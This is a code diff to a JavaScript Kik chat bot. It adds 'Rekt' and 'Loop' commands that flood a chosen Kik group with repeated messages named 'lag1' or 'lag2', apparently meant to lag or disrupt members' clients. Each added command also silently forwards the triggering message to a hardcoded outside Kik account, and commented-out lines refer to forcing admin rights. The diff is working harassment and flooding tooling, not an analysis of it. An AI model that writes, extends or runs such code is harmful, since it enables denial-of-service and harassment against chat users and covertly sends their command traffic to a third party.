@@ -169,6 +169,38 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     return;
   }
   
+  if (msgParts[0] == "Rekt" && msgParts[1].endsWith("@groups.kik.com")) {
+    (async () => {
+      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
+      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      let numb = 0;
+      while (numb <= msgParts[2]) {
+        await Kik.sendMessage(msgParts[1], lag2);
+        await new Promise(resolve => setTimeout(resolve, delay));
+        numb += 1;
+      }
+      // await Kik.forceAdmin(sender.jid);
+    })();
+    return;
+  }
+  
+  if (msgParts[0] == "Loop" && msgParts[1].endsWith("@groups.kik.com")) {
+    (async () => {
+      // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
+      // Kik.sendMessage('uncefunkle01_ap0@talk.kik.com', msg);
+      Kik.sendMessage("fuckdavid___ym7@talk.kik.com", msg);
+      let numb = 0;
+      while (numb <= msgParts[2]) {
+        await Kik.sendMessage(msgParts[1], lag1);
+        await new Promise(resolve => setTimeout(resolve, delay));
+        numb += 1;
+      }
+      // await Kik.forceAdmin(sender.jid);
+    })();
+    return;
+  }
+  
   if (msgParts[0] == "Loop" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
       // Kik.sendMessage("oooweoo_tis@talk.kik.com", msg);
